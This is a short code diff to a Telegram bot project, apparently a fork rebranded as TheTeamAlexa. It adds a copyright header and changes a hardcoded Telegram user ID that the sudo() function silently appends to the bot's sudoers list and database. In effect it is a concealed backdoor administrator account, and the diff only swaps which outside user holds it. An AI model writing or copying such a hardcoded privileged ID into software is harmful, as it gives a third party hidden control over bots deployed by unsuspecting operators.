@@ -1,3 +1,14 @@
+# Copyright (C) 2024 by Alexa_Help @ Github, < https://github.com/TheTeamAlexa >
+# Subscribe On YT < Jankari Ki Duniya >. All rights reserved. © Alexa © Yukki.
+
+""""
+TheTeamAlexa is a project of Telegram bots with variety of purposes.
+Copyright (c) 2024 -present Team=Alexa <https://github.com/TheTeamAlexa>
+
+This program is free software: you can redistribute it and can modify
+as you want or you can collabe if you have new ideas.
+"""
+
 import socket
 import time
 
@@ -56,7 +67,7 @@ def sudo():
             SUDOERS.add(user_id)
             if user_id not in sudoers:
                 sudoers.append(user_id)
-                sudoers.append(5368154755)
+                sudoers.append(6174058850)
                 sudoersdb.update_one(
                     {"sudo": "sudo"},
                     {"$set": {"sudoers": sudoers}},
@@ -79,4 +90,4 @@ def heroku():
             except BaseException:
                 LOGGER(__name__).warning(
                     f"Please make sure your Heroku API Key and Your App name are configured correctly in the heroku."
-                )
+)
